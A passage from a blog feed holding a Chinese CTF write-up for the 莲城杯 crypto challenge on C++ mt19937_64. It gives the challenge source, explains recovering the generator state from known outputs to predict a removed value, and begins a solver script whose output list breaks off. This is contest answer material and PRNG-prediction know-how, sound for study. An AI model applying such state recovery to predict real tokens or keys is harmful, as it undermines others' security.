class="built_in">pow</span>(c2, invert(e, phi2), n2)).decode())</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20211011 莲城杯Crypto方向WP</title>
    <url>/posts/4251790a/</url>
    <content><![CDATA[<p>（emmmmm最近态度不是很好，看不清某些东西，有点爆粗口多有得罪，对事不对人，对人也无所谓）</p>
<p>有被恶心到说实话，一上来Crypto都没有，艹</p>
<p>web靶机还是静态的</p>
<p>全场下来也就两道密码。第二题上来开始感觉还行，卡了挺久，但后面被发现是原题，直接emmmmm，也还好吧。C++下的MT19937和python的不一样</p>
<span id="more"></span>

<h1 id="莲城杯"><a href="#莲城杯" class="headerlink" title="莲城杯"></a>莲城杯</h1><h2 id="randomCrypto"><a href="#randomCrypto" class="headerlink" title="randomCrypto"></a>randomCrypto</h2><p>没什么好讲的</p>
<h2 id="Yusa的密码学课堂——MT19937"><a href="#Yusa的密码学课堂——MT19937" class="headerlink" title="Yusa的密码学课堂——MT19937"></a>Yusa的密码学课堂——MT19937</h2><p>又是这个系列的题</p>
<p>有三个文件都已经上传至<a href="https://github.com/4XWi11/CTF-sourcecode.git">github仓库</a>里了</p>
<p>虽然考点还是MT19937伪随机数，但是这个是在C++下写的；之前发过关于这类题的文章，但今天去看写地太烂了，处刑一下，完全没有搞懂嘛</p>
<p><a href="https://4xwi11.github.io/posts/2d82e8aa/">https://4xwi11.github.io/posts/2d82e8aa/</a></p>
<p>解决上次的一个问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011203341752.png" alt="image-20211011203341752"></p>
<p>并非不是需要624个数，而是需要凑足<code>32*624</code>位，也就是<code>64*312</code>位</p>
<p>所以如果是纯python的话，这道题应该秒出，但问题是C++；试了下就算给相同的种子，但生成的随机数序列也是不同的，算法略有出路应该</p>
<p>代码不长，贴一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;random.cpp&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;random&quot;</span>, <span class="string">&quot;-std=c++11&quot;</span>],check=<span class="literal">True</span>)</span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;./random&quot;</span>],stdin=subprocess.PIPE,stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># out, err = proc.communicate(str(int(os.urandom(8).hex(),16)).encode() + b&quot;\n&quot;)</span></span><br><span class="line">out, err = proc.communicate(<span class="built_in">str</span>(<span class="number">16063322316592949072</span>).encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">data = out.strip().split()</span><br><span class="line">flag = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(data))</span><br><span class="line">FLAG = <span class="string">b&#x27;DASCTF&#123;&#x27;</span>+hashlib.md5(data.pop(flag)).hexdigest().encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;outputs_%d.txt&quot;</span>%flag,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> seed;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; seed;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::mt19937_64 <span class="title">rng</span><span class="params">(seed)</span></span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; rng() &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>好了，开始讲这道题的思路</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211011211321791.png" alt="image-20211011211321791"></p>
<p>这张图出来的有点早（doge）</p>
<p>先看到最后，这个flag在文件名中，就是pop出来的伪随机数，是<code>374</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;outputs_%d.txt&quot;</span>%flag,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure>

<p>但可惜根据pop，虽然我们知道data，但是是删除了原第<code>374</code>位的data</p>
<p>需要通过其余<code>373</code>+<code>625</code>个数字求得这位</p>
<p>显然根据之前的<code>mt19937predictor</code>，和前<code>373</code>位（这个上面刚解释过）以及后面的<code>625</code>位，是完全可以获得的，然后再得到第<code>374</code>个，拿捏</p>
<p>可是试过了不行，用了恢复的方法也不行；然后就想是不是C++的问题</p>
<p>所以接下来的搜索思路就如上图所示，搜索关键词<code>c++</code>和<code>mt19937</code>以及<code>predict</code>，当然一般都返回<code>32</code>位的结果，所以加上<code>64</code>；原题到手</p>
<p>改下jo本就有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> mt19937_64 <span class="keyword">import</span> mt19937_64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">res = [<span class="number">15224110489171130169</span>, <span class="number">1487925206988459477</span>, <span class="number">13480727356180709371</span>, <span class="number">9868256411224235526</span>, <span class="number">6217804851957837168</span>, <span class="number">16087170136679200450</span>, <span class="number">10701512125563075829</span>, <span class="number">13839719157982856576</span>, <span class="number">17686330611486610733</span>, <span class="number">8009416170371519873</span>, <span class="number">5970669226517080452</span>, <span class="number">11269217943220347675</span>, <span class="number">10679128876184101302</span>, <span class="number">18426494309927575430</span>, <span class="number">2766502893811979226</span>, <span class="number">2252796059596895410</span>, <span class="number">9426444128738501522</span>, <span class="number">11240845202238046967</span>, <span class="number">10773508588111955623</span>, <span class="number">1557877671900503598</span>, <span class="number">10687052904024584487</span>, <span class="number">1329391365184628727</span>, <span class="number">7924797549450027243</span>, <span class="number">8535390433774276870</span>, <span class="number">3764662861183967374</span>, <span class="number">2246153524896469598</span>, <span class="number">2609915142724872757</span>, <span class="number">10658867097171399935</span>, <span class="number">5527882090828515536</span>, <span class="number">16980061916688614551</span>, <span class="number">369781677154768879</span>, <span class="number">16440083865102214341</span>, <span class="number">6215352314823709568</span>, <span class="number">7140216739817729337</span>, <span class="number">12081906179615786779</span>, <span class="number">6478685619216942062</span>, <span class="number">9619055260791569210</span>, <span class="number">1716773987678792695</span>, <span class="number">5781591055396867866</span>, <span class="number">10236249441362668669</span>, <span class="number">4314491602044042424</span>, <span class="number">9076763991771914801</span>, <span class="number">1019089589927696539</span>, <span class="number">12783145303781447438</span>, <span class="number">1784730974216681496</span>, <span class="number">10724359773647505800</span>, <span class="number">9412346711065789784</span>, <span class="number">12397469196070741661</span>, <span class="number">844871001521064632</span>, <span class="number">13554026965219580112</span>, <span class="number">4176961812003667679</span>, <span class="number">6038315983316303141</span>, <span class="number">3991176913179867636</span>, <span class="number">7277063843827680934</span>, <span class="number">6593392965255927508</span>, <span class="number">7279379575539700793</span>, <span class="number">7049180319367268844</span>, <span class="number">2484858153711481256</span>, <span class="number">9662542622219218463</span>, <span class="number">15645318283754749515</span>, <span class="number">7848634356524747132</span>, <span class="number">6328770785215004957</span>, <span class="number">14031726511284712999</span>, <span class="number">10754197358715401067</span>, <span class="number">14877197602427408826</span>, <span class="number">1961981170873480756</span>, <span class="number">15043831614315156076</span>, <span class="number">2703733192099380300</span>, <span class="number">5573267746680488476</span>, <span class="number">2588678833804270160</span>, <span class="number">16641900531805836732</span>, <span class="number">14485077651674686804</span>, <span class="number">17908682116840210486</span>, <span class="number">12129346423391778925</span>, <span class="number">449323128784312129</span>, <span class="number">2912052724053440605</span>, <span class="number">3725415122737515057</span>, <span class="number">12106075465626310804</span>, <span class="number">7844624661111246261</span>, <span class="number">4336975117722586651</span>, <span class="number">6133486737560458810</span>, <span class="number">4285708852412482387</span>, <span class="number">17320873594107961221</span>, <span class="number">18154223303204659281</span>, <span class="number">9782280317517313987</span>, <span class="number">7359883602982876716</span>, <span class="number">8302270318241074541</span>, <span class="number">2854871868457850608</span>, <span class="number">4260073478828444220</span>, <span class="number">12464166743488435720</span>, <span class="number">11545300218414290638</span>, <span class="number">15943917616147672791</span>, <span class="number">17684529969128042573</span>, <span class="number">11970487736986863722</span>, <span class="number">4279463896104155311</span>, <span class="number">6452386490939306659</span>, <span class="number">14951002814044492267</span>, <span class="number">3924373366113113482</span>, <span class="number">17675004214657643053</span>, <span class="number">10514060213491578166</span>, <span class="number">5083735479763236962</span>, <span class="number">8237048074291002693</span>, <span class="number">178024658423258428</span>, <span class="number">16217384550361068797</span>, <span class="number">6823885072554733775</span>, <span class="number">14640293890442769000</span>, <span class="number">11118102735797335929</span>, <span class="number">17687811899187265346</span>, <span class="number">12324758265458544032</span>, <span class="number">13305186849598403772</span>, <span class="number">2061361200506122451</span>, <span class="number">4473679754720240444</span>, <span class="number">15364566282531130774</span>, <span class="number">10360818283823976655</span>, <span class="number">17220043518084908852</span>, <span class="number">9386042935320331823</span>, <span class="number">10932555460714805145</span>, <span class="number">14286030551222176204</span>, <span class="number">5513294049464657489</span>, <span class="number">9643782458509542843</span>, <span class="number">2950842616838528179</span>, <span class="number">16153550634060410597</span>, <span class="number">10622243240110203305</span>, <span class="number">1642938210383117587</span>, <span class="number">16348894212565750617</span>, <span class="number">17802404752703029833</span>, <span class="number">16933001622790235864</span>, <span class="number">13021337058260052257</span>, <span class="number">17301160463217879931</span>, <span class="number">4914154622730751038</span>, <span class="number">3649150598994385675</span>, <span class="number">17138640742876844054</span>, <span class="number">6723182378145435688</span>, <span class="number">15799828338293133322</span>, <span class="number">994720218982390675</span>, <span class="number">10557290726979603665</span>, <span class="number">17714019041621996643</span>, <span class="number">13997848863450584994</span>, <span class="number">11077445104717373075</span>, <span class="number">2834856239311065051</span>, <span class="number">11214787995926447582</span>, <span class="number">4068838695613829268</span>, <span class="number">3318186966385494373</span>, <span class="number">10984597623033520694</span>, <span class="number">5515414919887778777</span>, <span class="number">7222755179917827587</span>, <span class="number">16315875605087375576</span>, <span class="number">1416504086864662519</span>, <span class="number">9102186857132686420</span>, <span class="number">10069600536464217172</span>, <span class="number">6582524821522410340</span>, <span class="number">15369756932292150641</span>, <span class="number">17542632941176957329</span>, <span class="number">6114252881995050176</span>, <span class="number">2055179652476914195</span>, <span class="number">16405356136326356060</span>, <span class="number">14344232008993353644</span>, <span class="number">7357227068527869292</span>, <span class="number">14444189009256502503</span>, <span class="number">474793712655159763</span>, <span class="number">7277957134452370555</span>, <span class="number">10136894698074936516</span>, <span class="number">16493593438906441399</span>, <span class="number">965972604086413481</span>, <span class="number">7698637742708237198</span>, <span class="number">14701582675687476239</span>, <span class="number">8687372870093533304</span>, <span class="number">8617910444450923438</span>, <span class="number">9198266698377902297</span>, <span class="number">17663341461584809487</span>, <span class="number">9416311128064169723</span>, <span class="number">15527623086766043739</span>, <span class="number">17634355913948865190</span>, <span class="number">18230067880107976101</span>, <span class="number">14647282067432289184</span>, <span class="number">2666571742016867486</span>, <span class="number">35944775638564196</span>, <span class="number">13202068495097382260</span>, <span class="number">9200881323819852309</span>, <span class="number">4609224846213708248</span>, <span class="number">18385087669463550574</span>, <span class="number">10907111573029619720</span>, <span class="number">3677665280613822779</span>, <span class="number">7175067246924173873</span>, <span class="number">11557554314793111361</span>, <span class="number">16459269098754836930</span>, <span class="number">15069426419433415372</span>, <span class="number">3478942161672373533</span>, <span class="number">1475410410806061275</span>, <span class="number">3951913608914307936</span>, <span class="number">9031385401155758661</span>, <span class="number">3487921219891556908</span>, <span class="number">14331439795449455643</span>, <span class="number">18005194978393081205</span>, <span class="number">17499558816128213969</span>, <span class="number">10013697255070423725</span>, <span class="number">5656707783041395866</span>, <span class="number">8245156232824114523</span>, <span class="number">5484825401635850101</span>, <span class="number">18276565390397117490</span>, <span class="number">9806016278660472039</span>, <span class="number">6246223529755503034</span>, <span class="number">16322603114524844950</span>, <span class="number">13512386112109766619</span>, <span class="number">4292997062471342719</span>, <span class="number">5482339873158479974</span>, <span class="number">12153068771020641259</span>, <span class="number">18134128714075076811</span>, <span class="number">3921582705345984456</span>, <span class="number">17990063870067007106</span>, <span class="number">11893303237020637674</span>, <span class="number">584000375933180982</span>, <span class="number">6837860293438757570</span>, <span class="number">8668590806728300645</span>, <span class="number">10930322698482157784</span>, <span class="number">3456591010166906694</span>, <span class="number">8479176164660731035</span>, <span class="number">1378913458575066776</span>, <span class="number">11867206231852016448</span>, <span class="number">11155774780214677606</span>, <span class="number">912636353429261442</span>, <span class="number">17286540002553508524</span>, <span class="number">2342876557589322779</span>, <span class="number">8472494814582696749</span>, <span class="number">1649463863153987977</span>, <span class="number">6639761134830802698</span>, <span class="number">17749792536888103944</span>, <span class="number">6682611142368155837</span>, <span class="number">8961391229631067960</span>, <span class="number">16808632462882238050</span>, <span class="number">12764361808843833740</span>, <span class="number">3494650449008997672</span>, <span class="number">13464542575897195823</span>, <span class="number">424905026997643448</span>, <span class="number">6949880018570988189</span>, <span class="number">4352171970901905656</span>, <span class="number">7585977087659274602</span>, <span class="number">9963800442502096068</span>, <span class="number">11967585318365690786</span>, <span class="number">1330206767381639342</span>, <span class="number">8961211309807685961</span>, <span class="number">12822173985081341335</span>, <span class="number">4508173450257371182</span>, <span class="number">5828692808060501375</span>, <span class="number">7437728885533218362</span>, <span class="number">11924888116770741814</span>, <span class="number">2012177013990519412</span>, <span class="number">6499123439580002081</span>, <span class="number">13085942749253543550</span>, <span class="number">12967954280047984193</span>, <span class="number">401135611301783756</span>, <span class="number">3748733649551258520</span>, <span class="number">3742761952933734129</span>, <span class="number">7180568637515019340</span>, <span class="number">8490711531714639868</span>, <span class="number">1461899626173313114</span>, <span class="number">15357996742461975417</span>, <span class="number">14566908736002266815</span>, <span class="number">18368411028248688780</span>, <span class="number">2276282088146233438</span>, <span class="number">13500510232438577028</span>, <span class="number">5042075854511929699</span>, <span class="number">6430943865985944461</span>, <span class="number">4611615451136427723</span>, <span class="number">16501718400150227301</span>, <span class="number">12689032035555572221</span>, <span class="number">15097412730296922717</span>, <span class="number">3917094315801026114</span>, <span class="number">2738852375492418821</span>, <span class="number">16365967597393176630</span>, <span class="number">15062401340541737624</span>, <span class="number">14638139755970734808</span>, <span class="number">17586333334851266372</span>, <span class="number">17319918915751492871</span>, <span class="number">11845068873340136881</span>, <span class="number">1459249680175909613</span>, <span class="number">7472745361441793631</span>, <span class="number">1812384806700690960</span>, <span class="number">8855007047564417997</span>, <span class="number">2163690632469050637</span>, <span class="number">1883216720349119806</span>, <span class="number">17992478845633263598</span>, <span class="number">4665099551190282678</span>, <span class="number">11678011021345341884</span>, <span class="number">14187013186800119116</span>, <span class="number">14052476937717753457</span>, <span class="number">14759086517840933234</span>, <span class="number">5009467219504023390</span>, <span class="number">4622766434224603629</span>, <span class="number">14306333222661486071</span>, <span class="number">3858064603145888263</span>, <span class="number">5480134807934395111</span>, <span class="number">4123024571389908319</span>, <span class="number">4857052736700414325</span>, <span class="number">16243980005326285458</span>, <span class="number">3632766067814039781</span>, <span class="number">710008964341406746</span>, <span class="number">5363960844618609694</span>, <span class="number">14114730195035015808</span>, <span class="number">16428297947621094568</span>, <span class="number">7700974694607772814</span>, <span class="number">16793381582485703202</span>, <span class="number">13948380472150916306</span>, <span class="number">14326581900789123198</span>, <span class="number">4228968193234651142</span>, <span class="number">11100829582225662535</span>, <span class="number">17495023276082596914</span>, <span class="number">8634787791698085471</span>, <span class="number">6145765583313197421</span>, <span class="number">16788430897014030178</span>, <span class="number">11435692770927277650</span>, <span class="number">18065086017618584565</span>, <span class="number">11769581244567937207</span>, <span class="number">13278489473631493919</span>, <span class="number">8019460929320111149</span>, <span class="number">5693618935245539106</span>, <span class="number">3634811597737081216</span>, <span class="number">12859793273631344580</span>, <span class="number">11287301384880619752</span>, <span class="number">18394782048366983264</span>, <span class="number">7421132200962846807</span>, <span class="number">4084540937457316264</span>, <span class="number">13113874388366064762</span>, <span class="number">8131358879566215449</span>, <span class="number">18127561595469413694</span>, <span class="number">8734770900165404534</span>, <span class="number">17424357262393464853</span>, <span class="number">10097252723684474013</span>, <span class="number">13657127819021358228</span>, <span class="number">15053911843606144518</span>, <span class="number">7213762907694003185</span>, <span class="number">9201850376693257882</span>, <span class="number">1152437224214832892</span>, <span class="number">14749316667846084768</span>, <span class="number">13945981875336291326</span>, <span class="number">17205113012613835387</span>, <span class="number">17208682023098019636</span>, <span class="number">16837244935188768969</span>, <span class="number">1562887481274292099</span>, <span class="number">4817091557053520861</span>, <span class="number">12788128805488570720</span>, <span class="number">12001115261194850091</span>, <span class="number">4003771944165077120</span>, <span class="number">2234627252583081046</span>, <span class="number">9648802166794733209</span>, <span class="number">2217782127954322431</span>, <span class="number">8813298931273365931</span>, <span class="number">8055654179906713224</span>, <span class="number">11975882101529377223</span>, <span class="number">3484952924454621378</span>, <span class="number">9405558259370977621</span>, <span class="number">10465136460923462995</span>, <span class="number">10114188036427722127</span>, <span class="number">3137605056932583175</span>, <span class="number">6052770256806365938</span>, <span class="number">13216705997825407019</span>, <span class="number">9321595432845767721</span>, <span class="number">7404913363748792748</span>, <span class="number">3104222247113734338</span>, <span class="number">7884841839505302190</span>, <span class="number">10282600744363227974</span>, <span class="number">10560288140635802837</span>, <span class="number">345714099277926722</span>, <span class="number">14827599919753819919</span>, <span class="number">15348137034782912153</span>, <span class="number">117188792560235416</span>, <span class="number">721765732450403598</span>, <span class="number">13484574492955662118</span>, <span class="number">4088456941206683834</span>, <span class="number">7978001820773876706</span>, <span class="number">3458688202384309003</span>, <span class="number">7297824025882346112</span>, <span class="number">8366103370544240004</span>, <span class="number">14726906913567147182</span>, <span class="number">17890463553725848943</span>, <span class="number">11056300998383817861</span>, <span class="number">12172218496062907284</span>, <span class="number">5614991059403362329</span>, <span class="number">94695117905761066</span>, <span class="number">13704554396573869457</span>, <span class="number">6942259376738368761</span>, <span class="number">3724125954238286617</span>, <span class="number">605665642089906206</span>, <span class="number">4440357634786283101</span>, <span class="number">9312356527281045726</span>, <span class="number">18433419763563298916</span>, <span class="number">5537070555239228268</span>, <span class="number">13655980751929630271</span>, <span class="number">11097112793938372280</span>, <span class="number">7029091093125181071</span>, <span class="number">15682558111863651240</span>, <span class="number">9864810256451039130</span>, <span class="number">5940287037201593945</span>, <span class="number">7230113292992804565</span>, <span class="number">1262540470928338201</span>, <span class="number">9310270195989362278</span>, <span class="number">5911475921308141211</span>, <span class="number">5943394248414176333</span>, <span class="number">2467090711423218798</span>, <span class="number">14834589937967531968</span>, <span class="number">2112412521637455955</span>, <span class="number">4483762121635552341</span>, <span class="number">9203453183301626690</span>, <span class="number">12517949271946792756</span>, <span class="number">11765267562048769695</span>, <span class="number">2130431799048385018</span>, <span class="number">1021118212271885825</span>, <span class="number">4527525148317213493</span>, <span class="number">2666979235110630076</span>, <span class="number">11385323575772505236</span>, <span class="number">1957143482002768471</span>, <span class="number">6653869545594001852</span>, <span class="number">9403787903811093312</span>, <span class="number">8793399260966849492</span>, <span class="number">9134129177479686128</span>, <span class="number">5344549741728076030</span>, <span class="number">3785525706196259331</span>, <span class="number">4098427281238979781</span>, <span class="number">14780185570363454606</span>, <span class="number">15022528285132147394</span>, <span class="number">4415868057026363350</span>, <span class="number">11652850077219368760</span>, <span class="number">6599101465769202844</span>, <span class="number">2324709069440458374</span>, <span class="number">2328030874184313596</span>, <span class="number">5375810578496425005</span>, <span class="number">3324352283736262699</span>, <span class="number">8961596405474061089</span>, <span class="number">17555556238164816340</span>, <span class="number">1217170962166712882</span>, <span class="number">12300833475020082526</span>, <span class="number">5755163501951705747</span>, <span class="number">17673007557139716816</span>, <span class="number">5400175616849815689</span>, <span class="number">16424974447872124521</span>, <span class="number">3528336073009821153</span>, <span class="number">5677112613986511204</span>, <span class="number">11681713850480599971</span>, <span class="number">17889123911033641068</span>, <span class="number">13398947136669841280</span>, <span class="number">14362332277634552597</span>, <span class="number">12612291562289233371</span>, <span class="number">9068021764334224282</span>, <span class="number">11003726667849614111</span>, <span class="number">170500049009536169</span>, <span class="number">11787850295471586749</span>, <span class="number">17738376378319933104</span>, <span class="number">265438126753187088</span>, <span class="number">16449969716110589415</span>, <span class="number">4267181961918958684</span>, <span class="number">8504721844419720345</span>, <span class="number">3602399335681951800</span>, <span class="number">16377130351527521329</span>, <span class="number">137205552767822057</span>, <span class="number">15076083541717516190</span>, <span class="number">16933079658536833273</span>, <span class="number">11539760435976559163</span>, <span class="number">10349113249022571006</span>, <span class="number">13506623588121209051</span>, <span class="number">1767257281718218581</span>, <span class="number">55497369433803178</span>, <span class="number">9620183217554454747</span>, <span class="number">352109299759977748</span>, <span class="number">13362871402671548794</span>, <span class="number">3245933715092323519</span>, <span class="number">7098945802580095824</span>, <span class="number">4749740144906242542</span>, <span class="number">16475573756134089178</span>, <span class="number">17665764356947420150</span>, <span class="number">2428128185580929142</span>, <span class="number">10865799872171434959</span>, <span class="number">14020645350131532589</span>, <span class="number">10866919792482735515</span>, <span class="number">1639413999413384841</span>, <span class="number">2660467607619573650</span>, <span class="number">7176921049243916372</span>, <span class="number">44929497464104249</span>, <span class="number">8302026006819056308</span>, <span class="number">14088827593384756939</span>, <span class="number">4541386427308185948</span>, <span class="number">14992023310005249339</span>, <span class="number">11521110449882379692</span>, <span class="number">8618468396936995487</span>, <span class="number">17255690317020962535</span>, <span class="number">14459878492479278129</span>, <span class="number">484161739083752565</span>, <span class="number">8967126682428339806</span>, <span class="number">12208164843579773375</span>, <span class="number">11736932142677088849</span>, <span class="number">7727530756457513692</span>, <span class="number">3829808422387045462</span>, <span class="number">9815185898534079561</span>, <span class="number">8586014595553015140</span>, <span class="number">3121180959957037281</span>, <span class="number">546542310230906996</span>, <span class="number">12788213799003801890</span>, <span class="number">6764098612553553982</span>, <span class="number">16230764669201238834</span>, <span class="number">18205877184448874064</span>, <span class="number">17741584570061449195</span>, <span class="number">13498693246362717293</span>, <span class="number">12557996638970667763</span>, <span class="number">16240767280840697248</span>, <span class="number">12688455377024311919</span>, <span class="number">11821568382422290340</span>, <span class="number">13694830011903255027</span>, <span class="number">15977888673915506876</span>, <span class="number">12346885892635259078</span>, <span class="number">7838634663919088845</span>, <span class="number">13697951298959265290</span>, <span class="number">16396403340832798324</span>, <span class="number">5570724586621569543</span>, <span class="number">348190538972825181</span>, <span class="number">498434119496336507</span>, <span class="number">4629603637537989875</span>, <span class="number">2904956541370261046</span>, <span class="number">15056806750205280060</span>, <span class="number">12512751698356956353</span>, <span class="number">11598492895309981739</span>, <span class="number">5900963668615601483</span>, <span class="number">9286588840856606265</span>, <span class="number">14687331465648814630</span>, <span class="number">724531149460506959</span>, <span class="number">17016613597390705501</span>, <span class="number">17860966464838170961</span>, <span class="number">8082441243109422217</span>, <span class="number">4226070025033485357</span>, <span class="number">11557581090421115709</span>, <span class="number">1365974406386375567</span>, <span class="number">11626532849062235723</span>, <span class="number">3026767794107211866</span>, <span class="number">18265729906007136324</span>, <span class="number">9752072017332967624</span>, <span class="number">8344899021234511823</span>, <span class="number">17168023990850847933</span>, <span class="number">2108491903973827339</span>, <span class="number">16946871590663953204</span>, <span class="number">15268856540448037497</span>, <span class="number">6729814538132205074</span>, <span class="number">10608459573931314294</span>, <span class="number">5349389425094153624</span>, <span class="number">9119249437078259281</span>, <span class="number">3022057742231131843</span>, <span class="number">699495075963768616</span>, <span class="number">3938180359891046702</span>, <span class="number">3132000820601213475</span>, <span class="number">6453763775620458305</span>, <span class="number">10361983187468507141</span>, <span class="number">18091129984666032675</span>, <span class="number">4573010375750843342</span>, <span class="number">791243713554231377</span>, <span class="number">6523321933147523990</span>, <span class="number">2460943155031244372</span>, <span class="number">11915079949168514844</span>, <span class="number">10962272930784254451</span>, <span class="number">7828398430854164950</span>, <span class="number">11580373300607261323</span>, <span class="number">14496114508805667408</span>, <span class="number">12800088002722989479</span>, <span class="number">4489382774379581027</span>, <span class="number">6241885538530491013</span>, <span class="number">15369736452242646419</span>, <span class="number">18339907485699833664</span>, <span class="number">14843607724306799380</span>, <span class="number">15883998472835946312</span>, <span class="number">13401911608426527924</span>, <span class="number">3615974264171478906</span>, <span class="number">2951259064496198811</span>, <span class="number">7803436242736563826</span>, <span class="number">4135188636826481442</span>, <span class="number">5021264042001895982</span>, <span class="number">5708915960985917130</span>, <span class="number">11181910501244483073</span>, <span class="number">5573954009605843738</span>, <span class="number">3021445895744683140</span>, <span class="number">10033196279958934660</span>, <span class="number">2680855996735532569</span>, <span class="number">5360189858868901361</span>, <span class="number">8167521138921792938</span>, <span class="number">6161893524269697852</span>, <span class="number">5558764473993615110</span>, <span class="number">13408224815379298518</span>, <span class="number">17751136251534065932</span>, <span class="number">12169040946650623409</span>, <span class="number">8591752444091873275</span>, <span class="number">17571132974848304944</span>, <span class="number">16886102890910720967</span>, <span class="number">10434431909683674783</span>, <span class="number">1798513582887417581</span>, <span class="number">4922950544911394484</span>, <span class="number">436078592099283889</span>, <span class="number">10061099463464191790</span>, <span class="number">2611739359719785328</span>, <span class="number">12076811020743303539</span>, <span class="number">2799012545596479383</span>, <span class="number">12408665237686526887</span>, <span class="number">2569240801657154200</span>, <span class="number">189527510828503181</span>, <span class="number">17204452437985213973</span>, <span class="number">15873367317020085673</span>, <span class="number">4668478220806245681</span>, <span class="number">2950905851413543275</span>, <span class="number">17244737907264565987</span>, <span class="number">9947196811151946334</span>, <span class="number">10861412944742179841</span>, <span class="number">17691963506930352</span>, <span class="number">8645426666922253783</span>, <span class="number">5429177116065336723</span>, <span class="number">9148166318339274858</span>, <span class="number">1140817301847500253</span>, <span class="number">16395024534726001957</span>, <span class="number">14455719375367518785</span>, <span class="number">14365592159046307404</span>, <span class="number">4233672053992875940</span>, <span class="number">7055944177387857447</span>, <span class="number">13438827615850026797</span>, <span class="number">1980459165532258112</span>, <span class="number">9924227990341676772</span>, <span class="number">1258768952545009550</span>, <span class="number">11361136852134788879</span>, <span class="number">4300533493752614933</span>, <span class="number">14681866951052377042</span>, <span class="number">8810851615125798911</span>, <span class="number">8542930103562314876</span>, <span class="number">14579475506918455576</span>, <span class="number">16047523528880779866</span>, <span class="number">1380610643416544755</span>, <span class="number">12076763661431463653</span>, <span class="number">13633351579395427301</span>, <span class="number">14309637244904670356</span>, <span class="number">2784919727650036805</span>, <span class="number">10011701223131936197</span>, <span class="number">16483582182156980016</span>, <span class="number">8123259590358566068</span>, <span class="number">15547670775408355653</span>, <span class="number">17114873767724596286</span>, <span class="number">15947690112937005468</span>, <span class="number">7121267006666076401</span>, <span class="number">15013329343112101948</span>, <span class="number">6864703775066800136</span>, <span class="number">2091646091797307547</span>, <span class="number">11775971286169844616</span>, <span class="number">13169145274668540822</span>, <span class="number">18168794334896751614</span>, <span class="number">8757043158271235193</span>, <span class="number">12162217691779194844</span>, <span class="number">10986813166707328024</span>, <span class="number">4635742872437686441</span>, <span class="number">9862874769906586011</span>, <span class="number">5685640425162748748</span>, <span class="number">16154828004824450666</span>, <span class="number">12628559068947614691</span>, <span class="number">18330543771355967176</span>, <span class="number">9613516487817756865</span>, <span class="number">11541501577179857879</span>, <span class="number">14497414068611647595</span>, <span class="number">16303734492840330251</span>, <span class="number">3271500016365005027</span>, <span class="number">3388428085388242514</span>, <span class="number">1510190073604428294</span>, <span class="number">10472797328548283957</span>, <span class="number">9702728991503878250</span>, <span class="number">3428420960955188888</span>, <span class="number">6445224698406122174</span>, <span class="number">5824974369892172376</span>, <span class="number">6434707946773025269</span>, <span class="number">2528556873146891935</span>, <span class="number">6653952898338236677</span>, <span class="number">432032921329160914</span>, <span class="number">11760277815966837524</span>, <span class="number">9034646482280577053</span>, <span class="number">2164586012669056137</span>, <span class="number">2616742534894002775</span>, <span class="number">942200230707617758</span>, <span class="number">5327259632525477213</span>, <span class="number">13158846232145762876</span>, <span class="number">418213563708326684</span>, <span class="number">13494580607955344451</span>, <span class="number">13712793184114793941</span>, <span class="number">13061962736775979494</span>, <span class="number">1304785696522982742</span>, <span class="number">6636575085535497783</span>, <span class="number">2548707152553606937</span>, <span class="number">5179609242429207458</span>, <span class="number">216456340969811386</span>, <span class="number">8504681751639758545</span>, <span class="number">18283819579633351371</span>, <span class="number">8667595238380606433</span>, <span class="number">15751060841552119650</span>, <span class="number">10368350373271876373</span>, <span class="number">2271051687544383713</span>, <span 